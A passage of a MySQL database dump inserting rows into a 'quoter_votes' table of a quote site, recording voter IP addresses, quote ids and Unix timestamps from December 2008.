  (8188,'74.6.22.182','',0,55,1230379894),
  (8189,'83.237.103.36','',0,294,1230379901),
  (8190,'83.237.103.36','',0,295,1230379919),
  (8191,'67.195.37.171','',0,286,1230381036),
  (8192,'77.35.255.159','',0,295,1230381151),
  (8193,'77.35.255.159','',0,292,1230381230),
  (8194,'66.249.66.47','',0,236,1230381903),
  (8195,'66.249.66.47','',0,106,1230382916),
  (8196,'80.90.116.71','',0,96,1230383250),
  (8197,'80.90.116.71','',0,119,1230383257),
  (8198,'80.90.116.71','',0,56,1230383276),
  (8199,'80.90.116.71','',0,16,1230383315),
  (8200,'90.151.159.199','',0,285,1230383322),
  (8201,'90.151.159.199','',0,295,1230383532),
  (8202,'67.195.37.171','',0,294,1230385341),
  (8203,'74.6.22.182','',0,156,1230385453),
  (8204,'83.239.239.154','',0,292,1230386383),
  (8205,'83.239.239.154','',0,284,1230386540),
  (8206,'66.249.66.47','',0,234,1230386683),
  (8207,'87.119.230.171','',0,285,1230387273),
  (8208,'87.119.230.171','',0,295,1230387284),
  (8209,'87.119.230.171','',0,294,1230387291),
  (8210,'87.119.230.171','',0,284,1230387296),
  (8211,'87.119.230.171','',0,281,1230387303),
  (8212,'87.119.230.171','',0,280,1230387309),
  (8213,'156.17.237.13','',0,295,1230387349),
  (8214,'66.249.66.47','',0,235,1230387445),
  (8215,'64.1.215.165','',0,69,1230388282),
  (8216,'67.195.37.171','',0,292,1230389012),
  (8217,'64.1.215.165','',0,255,1230389141),
  (8218,'67.202.43.229','',0,44,1230389438),
  (8219,'67.202.43.229','',0,58,1230389446),
  (8220,'67.202.43.229','',0,73,1230389455),
  (8221,'67.202.43.229','',0,236,1230389750),
  (8222,'194.9.50.67','',0,6,1230389907),
  (8223,'91.196.53.54','',0,259,1230389976),
  (8224,'67.195.37.171','',0,295,1230390313),
  (8225,'82.162.230.136','',0,229,1230390743),
  (8226,'82.162.230.136','',0,203,1230390747),
  (8227,'78.138.155.114','',0,294,1230391617),
  (8228,'74.6.22.182','',0,143,1230391876),
  (8229,'74.6.22.182','',0,214,1230392472),
  (8230,'74.6.22.182','',0,83,1230393580),
  (8231,'91.202.197.79','',0,238,1230393762),
  (8232,'93.120.141.61','',0,292,1230393858),
  (8233,'64.1.215.165','',0,219,1230393967),
  (8234,'93.120.141.61','',0,251,1230394308),
  (8235,'74.6.22.182','',0,140,1230394340),
  (8236,'93.120.141.61','',0,245,1230394349),
  (8237,'81.19.66.84','',0,251,1230394399),
  (8238,'91.202.197.79','',0,1,1230394421),
  (8239,'93.120.141.61','',0,229,1230394570),
  (8240,'81.19.66.84','',0,253,1230394580),
  (8241,'81.19.66.84','',0,254,1230394817),
  (8242,'81.19.66.84','',0,255,1230394820),
  (8243,'84.204.148.130','',0,295,1230394866),
  (8244,'81.19.66.84','',0,256,1230395001),
  (8245,'81.19.66.84','',0,258,1230395208),
  (8246,'81.19.66.84','',0,259,1230395209),
  (8247,'74.6.22.182','',0,1,1230395233),
  (8248,'81.19.66.84','',0,262,1230395369),
  (8249,'81.19.66.84','',0,263,1230395370),
  (8250,'81.19.66.84','',0,264,1230395625),
  (8251,'193.151.91.12','',0,262,1230397461),
  (8252,'91.122.17.253','',0,212,1230400235),
  (8253,'64.1.215.165','',0,66,1230400867),
  (8254,'74.6.22.182','',0,70,1230401061),
  (8255,'67.195.37.171','',0,286,1230402144),
  (8256,'64.1.215.165','',0,159,1230402424),
  (8257,'74.6.22.182','',0,145,1230402940),
  (8258,'64.1.215.165','',0,213,1230403677),
  (8259,'74.6.22.182','',0,128,1230404424),
  (8260,'64.1.215.165','',0,1,1230404874),
  (8261,'78.37.138.81','',0,286,1230405853),
  (8262,'77.88.30.246','',0,1,1230406025),
  (8263,'77.88.30.246','',0,2,1230406040),
  (8264,'77.88.30.246','',0,20,1230406058),
  (8265,'77.88.30.246','',0,62,1230406066),
  (8266,'64.1.215.165','',0,50,1230406106),
  (8267,'77.88.30.246','',0,69,1230406121),
  (8268,'77.88.30.246','',0,18,1230406131),
  (8269,'77.88.30.246','',0,93,1230406152),
  (8270,'77.88.30.246','',0,3,1230406167),
  (8271,'77.88.30.246','',0,21,1230406206),
  (8272,'77.88.30.246','',0,67,1230406230),
  (8273,'77.88.30.246','',0,100,1230406248),
  (8274,'77.88.30.246','',0,6,1230406276),
  (8275,'77.88.30.246','',0,63,1230406368),
  (8276,'77.88.30.246','',0,294,1230406375),
  (8277,'77.88.30.246','',0,71,1230406480),
  (8278,'77.88.30.246','',0,68,1230406484),
  (8279,'77.88.30.246','',0,94,1230406492),
  (8280,'77.88.30.246','',0,66,1230406504),
  (8281,'77.88.30.246','',0,96,1230406507),
  (8282,'77.88.30.246','',0,8,1230406565),
  (8283,'77.88.30.246','',0,176,1230406596),
  (8284,'77.88.30.246','',0,16,1230406613),
  (8285,'77.88.30.246','',0,12,1230406677),
  (8286,'194.6.197.193','',0,291,1230406677),
  (8287,'77.88.30.246','',0,134,1230406749),
  (8288,'77.88.30.246','',0,14,1230406758),
  (8289,'77.88.30.246','',0,70,1230406776),
  (8290,'77.88.30.246','',0,98,1230406872),
  (8291,'77.88.30.246','',0,4,1230406878),
  (8292,'64.1.215.165','',0,161,1230406907),
  (8293,'77.88.30.246','',0,95,1230406965),
  (8294,'66.249.66.47','',0,294,1230407521),
  (8295,'64.1.215.165','',0,152,1230408546),
  (8296,'66.249.66.47','',0,290,1230408814),
  (8297,'64.1.215.165','',0,272,1230409304),
  (8298,'74.6.22.182','',0,3,1230409927),
  (8299,'64.1.215.165','',0,163,1230412345),
  (8300,'64.1.215.165','',0,164,1230413579),
  (8301,'64.1.215.165','',0,238,1230413681),
  (8302,'74.6.22.182','',0,152,1230413708),
  (8303,'78.36.21.7','',0,291,1230413893),
  (8304,'78.36.21.7','',0,270,1230413932),
  (8305,'91.210.20.2','',0,291,1230414924),
  (8306,'91.210.20.2','',0,263,1230415155),
  (8307,'64.1.215.165','',0,147,1230417172),
  (8308,'74.6.22.182','',0,4,1230417405),
  (8309,'64.1.215.165','',0,208,1230418181),
  (8310,'74.6.22.182','',0,258,1230419242),
  (8311,'81.19.66.84','',0,1,1230419959),
  (8312,'81.19.66.84','',0,100,1230419968),
  (8313,'81.19.66.84','',0,108,1230420441),
  (8314,'81.19.66.84','',0,110,1230420619),
  (8315,'81.19.66.84','',0,111,1230420623),
  (8316,'81.19.66.84','',0,113,1230420808),
  (8317,'81.19.66.84','',0,118,1230420815),
  (8318,'81.19.66.84','',0,12,1230420927),
  (8319,'81.19.66.84','',0,125,1230420985),
  (8320,'81.19.66.84','',0,128,1230420989),
  (8321,'81.19.66.84','',0,130,1230421113),
  (8322,'81.19.66.84','',0,133,1230421120),
  (8323,'81.19.66.84','',0,134,1230421174),
  (8324,'81.19.66.84','',0,135,1230421237),
  (8325,'81.19.66.84','',0,136,1230421240),
  (8326,'81.19.66.84','',0,138,1230421282),
  (8327,'81.19.66.84','',0,139,1230421284),
  (8328,'81.19.66.84','',0,143,1230421340),
  (8329,'81.19.66.84','',0,144,1230421441),
  (8330,'81.19.66.84','',0,147,1230421443),
  (8331,'81.19.66.84','',0,152,1230421474),
  (8332,'81.19.66.84','',0,163,1230421476),
  (8333,'81.19.66.84','',0,165,1230421530),
  (8334,'81.19.66.84','',0,178,1230421562),
  (8335,'81.19.66.84','',0,183,1230421705),
  (8336,'81.19.66.84','',0,184,1230421706),
  (8337,'81.19.66.84','',0,190,1230421730),
  (8338,'81.19.66.84','',0,197,1230421735),
  (8339,'64.1.215.165','',0,67,1230421775),
  (8340,'81.19.66.84','',0,199,1230421793),
  (8341,'81.19.66.84','',0,2,1230421795),
  (8342,'81.19.66.84','',0,201,1230421822),
  (8343,'81.19.66.84','',0,202,1230421876),
  (8344,'81.19.66.84','',0,203,1230421880),
  (8345,'81.19.66.84','',0,204,1230421912),
  (8346,'81.19.66.84','',0,205,1230421914),
  (8347,'81.19.66.84','',0,206,1230422028),
  (8348,'81.19.66.84','',0,207,1230422052),
  (8349,'81.19.66.84','',0,208,1230422057),
  (8350,'81.19.66.84','',0,212,1230422116),
  (8351,'81.19.66.84','',0,213,1230422120),
  (8352,'81.19.66.84','',0,214,1230422149),
  (8353,'81.19.66.84','',0,215,1230422205),
  (8354,'81.19.66.84','',0,216,1230422208),
  (8355,'81.19.66.84','',0,218,1230422310),
  (8356,'81.19.66.84','',0,219,1230422312),
  (8357,'81.19.66.84','',0,220,1230422342),
  (8358,'81.19.66.84','',0,221,1230422397),
  (8359,'81.19.66.84','',0,222,1230422401),
  (8360,'81.19.66.84','',0,223,1230422454),
  (8361,'81.19.66.84','',0,227,1230422458),
  (8362,'81.19.66.84','',0,229,1230422498),
  (8363,'64.1.215.165','',0,38,1230422574),
  (8364,'81.19.66.84','',0,23,1230422604),
  (8365,'81.19.66.84','',0,230,1230422608),
  (8366,'81.19.66.84','',0,231,1230422644),
  (8367,'81.19.66.84','',0,233,1230422647),
  (8368,'81.19.66.84','',0,234,1230422698),
  (8369,'81.19.66.84','',0,235,1230422734),
  (8370,'81.19.66.84','',0,236,1230422740),
  (8371,'81.19.66.84','',0,238,1230422787),
  (8372,'81.19.66.84','',0,24,1230422792),
  (8373,'64.1.215.165','',0,99,1230422802),
  (8374,'81.19.66.84','',0,240,1230422839),
  (8375,'81.19.66.84','',0,241,1230422885),
  (8376,'81.19.66.84','',0,242,1230422889),
  (8377,'81.19.66.84','',0,243,1230422932),
  (8378,'81.19.66.84','',0,245,1230422936),
  (8379,'81.19.66.84','',0,246,1230422979),
  (8380,'81.19.66.84','',0,247,1230423019),
  (8381,'81.19.66.84','',0,258,1230423020),
  (8382,'81.19.66.84','',0,259,1230423065),
  (8383,'81.19.66.84','',0,262,1230423067),
  (8384,'81.19.66.84','',0,263,1230423104),
  (8385,'81.19.66.84','',0,264,1230423211),
  (8386,'81.19.66.84','',0,265,1230423214),
  (8387,'81.19.66.84','',0,270,1230423243),
  (8388,'81.19.66.84','',0,272,1230423298),
  (8389,'81.19.66.84','',0,274,1230423331),
  (8390,'81.19.66.84','',0,279,1230423384),
  (8391,'81.19.66.84','',0,3,1230423532),
  (8392,'81.19.66.84','',0,4,1230423560),
  (8393,'81.19.66.84','',0,44,1230423565),
  (8394,'81.19.66.84','',0,50,1230423617),
  (8395,'81.19.66.84','',0,55,1230423646),
  (8396,'81.19.66.84','',0,58,1230423649),
  (8397,'81.19.66.84','',0,60,1230423705),
  (8398,'81.19.66.84','',0,62,1230423709),
  (8399,'81.19.66.84','',0,73,1230423736),
  (8400,'64.1.215.165','',0,223,1230423774),
  (8401,'81.19.66.84','',0,74,1230423792),
  (8402,'81.19.66.84','',0,77,1230423795),
  (8403,'81.19.66.84','',0,84,1230423821),
  (8404,'81.19.66.84','',0,85,1230423883),
  (8405,'81.19.66.84','',0,87,1230423888),
  (8406,'81.19.66.84','',0,88,1230423909),
  (8407,'81.19.66.84','',0,89,1230423912),
  (8408,'81.19.66.84','',0,94,1230423969),
  (8409,'81.19.66.84','',0,99,1230423991),
  (8410,'64.1.215.165','',0,214,1230424281),
  (8411,'78.24.227.44','',0,55,1230426420),
  (8412,'78.24.227.44','',0,1,1230426424),
  (8413,'91.187.13.229','',0,279,1230427045),
  (8414,'66.249.66.47','',0,292,1230427322),
  (8415,'64.1.215.165','',0,163,1230428817),
  (8416,'64.1.215.165','',0,70,1230429037),
  (8417,'67.195.37.171','',0,289,1230429257),
  (8418,'64.1.215.165','',0,212,1230429344),
  (8419,'64.1.215.165','',0,229,1230430504),
  (8420,'74.6.22.182','',0,292,1230431053),
  (8421,'74.6.22.182','',0,287,1230431064),
  (8422,'74.6.22.182','',0,290,1230431067),
  (8423,'74.6.22.182','',0,289,1230431071),
  (8424,'74.6.22.182','',0,288,1230431076),
  (8425,'74.6.22.182','',0,286,1230431102),
  (8426,'74.6.22.182','',0,291,1230431105),
  (8427,'74.6.22.182','',0,294,1230431121),
  (8428,'74.6.22.182','',0,296,1230431142),
  (8429,'74.6.22.182','',0,285,1230431317),
  (8430,'64.1.215.165','',0,251,1230432566),
  (8431,'74.6.22.182','',0,255,1230432646),
  (8432,'194.85.160.55','',0,296,1230432668),
  (8433,'194.85.160.55','',0,294,1230432680),
  (8434,'194.85.160.55','',0,286,1230432772),
  (8435,'194.85.160.55','',0,265,1230432845),
  (8436,'64.1.215.165','',0,161,1230434444),
  (8437,'64.1.215.165','',0,63,1230437514),
  (8438,'78.24.225.226','',0,1,1230437520),
  (8439,'78.24.225.226','',0,55,1230437522),
  (8440,'81.18.116.69','',0,294,1230440165),
  (8441,'64.1.215.165','',0,218,1230440390),
  (8442,'81.18.116.69','',0,238,1230440402),
  (8443,'91.202.197.79','',0,296,1230440512),
  (8444,'74.6.22.182','',0,201,1230441644),
  (8445,'64.1.215.165','',0,235,1230442852),
  (8446,'64.1.215.165','',0,172,1230443437),
  (8447,'64.1.215.165','',0,203,1230443826),
  (8448,'74.6.22.182','',0,255,1230445430),
  (8449,'64.1.215.165','',0,195,1230445639),
  (8450,'89.251.170.94','',0,296,1230447385),
  (8451,'89.251.170.94','',0,292,1230447392),
  (8452,'66.249.66.47','',0,296,1230447411),
  (8453,'89.251.170.94','',0,291,1230447422),
  (8454,'64.1.215.165','',0,292,1230447734),
  (8455,'78.24.225.226','',0,1,1230448270),
  (8456,'78.24.225.226','',0,55,1230448272),
  (8457,'74.6.22.182','',0,142,1230448622),
  (8458,'66.249.66.47','',0,272,1230448778),
  (8459,'74.6.22.182','',0,296,1230450291),
  (8460,'79.171.124.210','',0,296,1230451272),
  (8461,'66.249.66.47','',0,289,1230451366),
  (8462,'64.1.215.165','',0,223,1230451539),
  (8463,'64.1.215.165','',0,213,1230452319),
  (8464,'64.1.215.165','',0,136,1230452689),
  (8465,'64.1.215.165','',0,234,1230453165),
  (8466,'64.1.215.165','',0,16,1230453176),
  (8467,'64.1.215.165','',0,66,1230453994),
  (8468,'66.249.66.47','',0,286,1230454019),
  (8469,'91.122.21.204','',0,212,1230454465),
  (8470,'64.1.215.165','',0,197,1230455297),
  (8471,'64.1.215.165','',0,172,1230456008),
  (8472,'74.6.22.182','',0,264,1230456241),
  (8473,'91.202.197.79','',0,296,1230457107),
  (8474,'91.202.197.79','',0,297,1230458721),
  (8475,'81.18.116.69','',0,297,1230459072),
  (8476,'74.6.22.182','',0,183,1230459909),
  (8477,'74.6.22.182','',0,249,1230460244),
  (8478,'64.1.215.165','',0,254,1230460337),
  (8479,'66.249.66.47','',0,118,1230460806),
  (8480,'66.249.66.47','',0,292,1230461199),
  (8481,'74.6.22.182','',0,141,1230461439),
  (8482,'64.1.215.165','',0,30,1230462373),
  (8483,'66.249.66.47','',0,110,1230462524),
  (8484,'66.249.66.47','',0,286,1230462807),
  (8485,'64.1.215.165','',0,111,1230463132),
  (8486,'66.249.66.47','',0,138,1230464801),
  (8487,'64.1.215.165','',0,272,1230465270),
  (8488,'91.195.22.32','',0,296,1230465560),
  (8489,'74.6.22.182','',0,163,1230466442),
  (8490,'92.124.166.200','',0,286,1230466957),
  (8491,'74.6.22.182','',0,249,1230467568),
  (8492,'88.204.14.4','',0,136,1230467692),
  (8493,'88.204.14.4','',0,73,1230467735),
  (8494,'88.204.14.4','',0,58,1230467999),
  (8495,'88.204.14.4','',0,135,1230468008),
  (8496,'88.204.14.4','',0,236,1230468017),
  (8497,'88.204.14.4','',0,245,1230468098),
  (8498,'88.204.14.4','',0,125,1230468179),
  (8499,'88.204.14.4','',0,99,1230468207),
  (8500,'88.204.14.4','',0,62,1230468215);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 8500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (8501,'88.204.14.4','',0,50,1230468255),
  (8502,'66.249.66.47','',0,223,1230468259),
  (8503,'66.249.66.47','',0,118,1230468393),
  (8504,'88.204.14.4','',0,296,1230469017),
  (8505,'66.249.66.47','',0,283,1230469401),
  (8506,'93.178.76.176','',0,296,1230470149),
  (8507,'64.1.215.165','',0,155,1230470424),
  (8508,'64.1.215.165','',0,189,1230470525),
  (8509,'66.249.66.47','',0,289,1230471724),
  (8510,'64.1.215.165','',0,88,1230472159),
  (8511,'64.1.215.165','',0,113,1230473728),
  (8512,'66.249.66.47','',0,290,1230476168),
  (8513,'74.6.22.182','',0,76,1230476899),
  (8514,'79.171.124.210','',0,296,1230477215),
  (8515,'64.1.215.165','',0,251,1230478512),
  (8516,'88.204.14.4','',0,292,1230478760),
  (8517,'88.204.14.4','',0,202,1230478873),
  (8518,'78.138.155.114','',0,265,1230478956),
  (8519,'91.211.5.240','',0,235,1230480195),
  (8520,'213.187.124.14','',0,279,1230480250),
  (8521,'213.187.124.14','',0,270,1230480311),
  (8522,'91.211.5.240','',0,212,1230480317),
  (8523,'213.187.124.14','',0,264,1230480323),
  (8524,'213.187.124.14','',0,262,1230480374),
  (8525,'213.187.124.14','',0,259,1230480469),
  (8526,'93.80.226.36','',0,289,1230480491),
  (8527,'213.187.124.14','',0,242,1230480560),
  (8528,'93.80.226.36','',0,85,1230480641),
  (8529,'93.80.226.36','',0,12,1230480648),
  (8530,'93.80.226.36','',0,265,1230480653),
  (8531,'93.80.226.36','',0,246,1230480755),
  (8532,'213.187.124.14','',0,233,1230480799),
  (8533,'93.80.226.36','',0,163,1230480852),
  (8534,'213.187.124.14','',0,218,1230480884),
  (8535,'93.80.226.36','',0,133,1230480949),
  (8536,'74.6.22.182','',0,134,1230480979),
  (8537,'93.80.226.36','',0,292,1230480981),
  (8538,'93.80.226.36','',0,223,1230481087),
  (8539,'195.22.110.57','',0,283,1230481132),
  (8540,'213.187.124.14','',0,201,1230481161),
  (8541,'93.80.226.36','',0,202,1230481176),
  (8542,'64.1.215.165','',0,218,1230481181),
  (8543,'213.187.124.14','',0,199,1230481243),
  (8544,'213.187.124.14','',0,197,1230481250),
  (8545,'213.187.124.14','',0,195,1230481301),
  (8546,'213.187.124.14','',0,164,1230481382),
  (8547,'213.187.124.14','',0,140,1230481429),
  (8548,'64.1.215.165','',0,58,1230481473),
  (8549,'64.1.215.165','',0,154,1230482169),
  (8550,'74.6.22.182','',0,178,1230482265),
  (8551,'64.1.215.165','',0,241,1230483522),
  (8552,'86.57.220.63','',0,299,1230483748),
  (8553,'86.57.220.63','',0,298,1230483763),
  (8554,'91.122.136.85','',0,298,1230483933),
  (8555,'217.66.22.66','',0,299,1230483943),
  (8556,'91.122.136.85','',0,299,1230483945),
  (8557,'217.66.22.66','',0,298,1230483947),
  (8558,'93.181.222.30','',0,298,1230484157),
  (8559,'93.181.222.30','',0,299,1230484172),
  (8560,'86.106.217.140','',0,9,1230484316),
  (8561,'86.57.220.63','',0,301,1230484334),
  (8562,'86.106.217.140','',0,20,1230484378),
  (8563,'77.52.100.38','',0,298,1230484387),
  (8564,'86.106.217.140','',0,301,1230484432),
  (8565,'86.106.217.140','',0,300,1230484435),
  (8566,'78.106.202.250','',0,299,1230484522),
  (8567,'217.175.33.119','',0,299,1230484708),
  (8568,'80.232.239.12','',0,299,1230484723),
  (8569,'94.178.9.237','',0,299,1230484736),
  (8570,'81.25.55.17','',0,299,1230484756),
  (8571,'78.106.202.250','',0,270,1230484870),
  (8572,'78.106.202.250','',0,265,1230484919),
  (8573,'74.6.22.182','',0,139,1230485072),
  (8574,'78.106.202.250','',0,1,1230485194),
  (8575,'194.44.235.54','',0,298,1230485205),
  (8576,'86.106.217.140','',0,242,1230485217),
  (8577,'78.106.202.250','',0,301,1230485359),
  (8578,'81.25.55.17','',0,290,1230485391),
  (8579,'81.25.55.17','',0,289,1230485397),
  (8580,'193.200.150.23','',0,299,1230485923),
  (8581,'202.71.103.82','',0,299,1230486006),
  (8582,'74.6.22.182','',0,155,1230486100),
  (8583,'79.174.64.146','',0,299,1230486137),
  (8584,'74.6.22.182','',0,128,1230486212),
  (8585,'91.204.161.125','',0,299,1230486235),
  (8586,'95.24.43.250','',0,301,1230486446),
  (8587,'208.53.147.16','',0,299,1230486513),
  (8588,'83.222.23.249','',0,299,1230486585),
  (8589,'83.222.23.249','',0,298,1230486591),
  (8590,'83.222.23.249','',0,300,1230486605),
  (8591,'208.76.240.226','',0,299,1230486753),
  (8592,'208.76.240.226','',0,298,1230486767),
  (8593,'77.221.130.6','',0,299,1230486880),
  (8594,'67.159.44.138','',0,299,1230486919),
  (8595,'67.195.37.171','',0,292,1230486951),
  (8596,'67.159.45.52','',0,299,1230486959),
  (8597,'82.192.79.97','',0,299,1230486970),
  (8598,'217.118.90.140','',0,300,1230487067),
  (8599,'194.44.235.54','',0,262,1230487376),
  (8600,'208.77.91.43','',0,299,1230487421),
  (8601,'83.69.224.215','',0,299,1230487696),
  (8602,'93.185.182.24','',0,300,1230487706),
  (8603,'93.185.182.24','',0,301,1230487721),
  (8604,'93.185.182.24','',0,298,1230488286),
  (8605,'93.185.182.24','',0,299,1230488393),
  (8606,'193.200.150.189','',0,299,1230488408),
  (8607,'86.57.220.63','',0,296,1230488448),
  (8608,'64.1.215.165','',0,292,1230489322),
  (8609,'92.50.248.33','',0,300,1230490030),
  (8610,'217.117.184.19','',0,286,1230490051),
  (8611,'64.1.215.165','',0,109,1230490334),
  (8612,'89.31.118.252','',0,299,1230490427),
  (8613,'217.117.184.19','',0,213,1230490518),
  (8614,'217.117.184.19','',0,212,1230490655),
  (8615,'91.124.47.209','',0,300,1230491368),
  (8616,'91.124.47.209','',0,301,1230491373),
  (8617,'74.6.22.182','',0,206,1230492141),
  (8618,'93.84.35.13','',0,299,1230493042),
  (8619,'64.1.215.165','',0,204,1230493444),
  (8620,'64.1.215.165','',0,202,1230495029),
  (8621,'81.25.55.17','',0,299,1230496583),
  (8622,'193.238.153.30','',0,301,1230496938),
  (8623,'193.238.153.30','',0,300,1230496947),
  (8624,'91.210.20.2','',0,302,1230497698),
  (8625,'91.210.20.2','',0,301,1230497707),
  (8626,'91.210.20.2','',0,300,1230497715),
  (8627,'74.6.22.182','',0,113,1230499056),
  (8628,'74.6.22.182','',0,165,1230501456),
  (8629,'94.253.49.172','',0,302,1230502073),
  (8630,'94.253.49.172','',0,301,1230502082),
  (8631,'94.253.49.172','',0,300,1230502087),
  (8632,'94.253.49.172','',0,298,1230502238),
  (8633,'92.242.16.39','',0,300,1230504187),
  (8634,'74.6.22.182','',0,18,1230504213),
  (8635,'91.185.55.165','',0,300,1230504352),
  (8636,'92.242.16.39','',0,298,1230504389),
  (8637,'91.185.55.165','',0,302,1230504404),
  (8638,'91.185.55.165','',0,301,1230504407),
  (8639,'92.242.16.39','',0,299,1230504559),
  (8640,'93.84.35.13','',0,299,1230506780),
  (8641,'93.84.35.13','',0,298,1230506928),
  (8642,'64.1.215.165','',0,24,1230507572),
  (8643,'64.1.215.165','',0,134,1230507846),
  (8644,'74.6.22.154','',0,147,1230508670),
  (8645,'93.84.47.123','',0,258,1230508713),
  (8646,'93.84.47.123','',0,299,1230508720),
  (8647,'93.84.47.123','',0,298,1230508736),
  (8648,'193.200.150.29','',0,299,1230508805),
  (8649,'67.159.44.138','',0,299,1230508858),
  (8650,'79.174.64.146','',0,299,1230508884),
  (8651,'202.71.103.82','',0,299,1230508892),
  (8652,'213.171.218.95','',0,299,1230508972),
  (8653,'67.159.45.52','',0,299,1230509027),
  (8654,'208.43.101.92','',0,299,1230509266),
  (8655,'221.130.187.73','',0,299,1230509932),
  (8656,'93.85.36.185','',0,299,1230510227),
  (8657,'64.1.215.165','',0,185,1230510379),
  (8658,'91.202.197.79','',0,302,1230511213),
  (8659,'91.202.197.79','',0,301,1230511216),
  (8660,'91.202.197.79','',0,300,1230511221),
  (8661,'91.202.197.79','',0,299,1230511225),
  (8662,'91.202.197.79','',0,298,1230511246),
  (8663,'74.6.22.154','',0,199,1230511793),
  (8664,'91.124.47.209','',0,302,1230513263),
  (8665,'74.6.22.154','',0,283,1230513852),
  (8666,'74.6.22.154','',0,238,1230514477),
  (8667,'74.6.22.154','',0,247,1230514532),
  (8668,'74.6.22.154','',0,248,1230514566),
  (8669,'74.6.22.154','',0,215,1230516780),
  (8670,'74.6.22.154','',0,223,1230516819),
  (8671,'64.1.215.165','',0,129,1230517063),
  (8672,'74.6.22.154','',0,299,1230517551),
  (8673,'74.6.22.154','',0,300,1230517564),
  (8674,'74.6.22.154','',0,302,1230517661),
  (8675,'74.6.22.154','',0,298,1230517662),
  (8676,'74.6.22.154','',0,301,1230517708),
  (8677,'64.1.215.165','',0,24,1230518101),
  (8678,'74.6.22.154','',0,234,1230524148),
  (8679,'74.6.22.154','',0,135,1230525257),
  (8680,'80.243.71.189','',0,302,1230525966),
  (8681,'80.243.71.189','',0,301,1230525968),
  (8682,'80.243.71.189','',0,300,1230525971),
  (8683,'80.243.71.189','',0,299,1230525979),
  (8684,'80.243.71.189','',0,298,1230525980),
  (8685,'80.243.71.189','',0,297,1230525983),
  (8686,'80.243.71.189','',0,296,1230525985),
  (8687,'80.243.71.189','',0,292,1230525987),
  (8688,'80.243.71.189','',0,291,1230525992),
  (8689,'74.6.22.154','',0,213,1230527752),
  (8690,'74.6.22.154','',0,14,1230529253),
  (8691,'74.6.22.154','',0,133,1230531351),
  (8692,'66.249.66.47','',0,270,1230532152),
  (8693,'64.1.215.165','',0,115,1230532331),
  (8694,'89.218.24.88','',0,55,1230532606),
  (8695,'89.218.24.88','',0,1,1230532609),
  (8696,'89.218.24.88','',0,258,1230532633),
  (8697,'66.249.66.47','',0,54,1230534629),
  (8698,'91.192.32.50','',0,302,1230535175),
  (8699,'91.192.32.50','',0,301,1230535196),
  (8700,'91.192.32.50','',0,300,1230535206),
  (8701,'91.192.32.50','',0,299,1230535348),
  (8702,'91.192.32.50','',0,298,1230535388),
  (8703,'91.192.32.50','',0,297,1230535574),
  (8704,'91.192.32.50','',0,296,1230535619),
  (8705,'91.192.32.50','',0,292,1230535634),
  (8706,'91.192.32.50','',0,1,1230535777),
  (8707,'91.192.32.50','',0,55,1230535781),
  (8708,'91.192.32.50','',0,56,1230535790),
  (8709,'91.192.32.50','',0,21,1230535809),
  (8710,'91.192.32.50','',0,212,1230535829),
  (8711,'91.192.32.50','',0,173,1230535861),
  (8712,'91.192.32.50','',0,18,1230535877),
  (8713,'91.192.32.50','',0,120,1230535882),
  (8714,'82.116.46.212','',0,300,1230536143),
  (8715,'82.116.46.212','',0,292,1230536151),
  (8716,'82.116.46.212','',0,290,1230536219),
  (8717,'66.249.66.47','',0,279,1230536384),
  (8718,'82.116.46.212','',0,303,1230536510),
  (8719,'212.59.115.90','',0,301,1230536915),
  (8720,'212.59.115.90','',0,300,1230536922),
  (8721,'212.59.115.90','',0,292,1230537141),
  (8722,'74.6.22.154','',0,235,1230537731),
  (8723,'66.249.66.47','',0,274,1230538743),
  (8724,'74.6.22.154','',0,298,1230538819),
  (8725,'80.66.68.222','',0,87,1230539420),
  (8726,'66.249.66.47','',0,270,1230539903),
  (8727,'74.6.22.154','',0,236,1230540758),
  (8728,'66.249.66.47','',0,38,1230540889),
  (8729,'74.6.22.154','',0,58,1230541981),
  (8730,'64.1.215.165','',0,199,1230542023),
  (8731,'74.6.22.154','',0,262,1230542209),
  (8732,'93.85.34.160','',0,299,1230542221),
  (8733,'93.85.34.160','',0,298,1230542229),
  (8734,'89.179.122.69','',0,299,1230542265),
  (8735,'66.249.66.47','',0,298,1230542421),
  (8736,'193.200.150.137','',0,299,1230542610),
  (8737,'217.159.130.58','',0,300,1230542680),
  (8738,'67.159.44.138','',0,299,1230542723),
  (8739,'217.159.130.58','',0,291,1230542780),
  (8740,'79.174.64.146','',0,299,1230542801),
  (8741,'217.159.130.58','',0,288,1230542829),
  (8742,'217.159.130.58','',0,279,1230542907),
  (8743,'217.159.130.58','',0,274,1230543083),
  (8744,'217.159.130.58','',0,270,1230543106),
  (8745,'91.202.197.79','',0,303,1230543327),
  (8746,'91.202.197.79','',0,302,1230543329),
  (8747,'91.202.197.79','',0,301,1230543332),
  (8748,'91.202.197.79','',0,300,1230543339),
  (8749,'91.202.197.79','',0,299,1230543343),
  (8750,'91.202.197.79','',0,298,1230543345),
  (8751,'217.159.130.58','',0,264,1230543813),
  (8752,'64.1.215.165','',0,107,1230544709),
  (8753,'217.159.130.58','',0,263,1230545028),
  (8754,'217.159.130.58','',0,262,1230545047),
  (8755,'217.159.130.58','',0,259,1230545074),
  (8756,'217.159.130.58','',0,250,1230545114),
  (8757,'217.159.130.58','',0,242,1230545119),
  (8758,'217.159.130.58','',0,233,1230545214),
  (8759,'217.159.130.58','',0,238,1230545224),
  (8760,'91.192.32.50','',0,301,1230545228),
  (8761,'66.249.66.47','',0,299,1230545562),
  (8762,'78.24.227.233','',0,1,1230545901),
  (8763,'78.24.227.233','',0,55,1230545903),
  (8764,'156.17.237.13','',0,302,1230546437),
  (8765,'156.17.237.13','',0,301,1230546440),
  (8766,'156.17.237.13','',0,299,1230546568),
  (8767,'156.17.237.13','',0,298,1230546581),
  (8768,'195.14.49.230','',0,297,1230546789),
  (8769,'195.14.49.230','',0,291,1230546795),
  (8770,'195.14.49.230','',0,288,1230546839),
  (8771,'195.14.49.230','',0,287,1230546856),
  (8772,'195.14.49.230','',0,279,1230546871),
  (8773,'195.14.49.230','',0,274,1230546882),
  (8774,'195.14.49.230','',0,270,1230546899),
  (8775,'195.14.49.230','',0,264,1230546905),
  (8776,'195.14.49.230','',0,263,1230546913),
  (8777,'195.14.49.230','',0,262,1230546915),
  (8778,'195.14.49.230','',0,259,1230546922),
  (8779,'195.14.49.230','',0,254,1230546934),
  (8780,'195.14.49.230','',0,250,1230546950),
  (8781,'195.14.49.230','',0,242,1230546959),
  (8782,'195.14.49.230','',0,238,1230546989),
  (8783,'195.14.49.230','',0,233,1230547006),
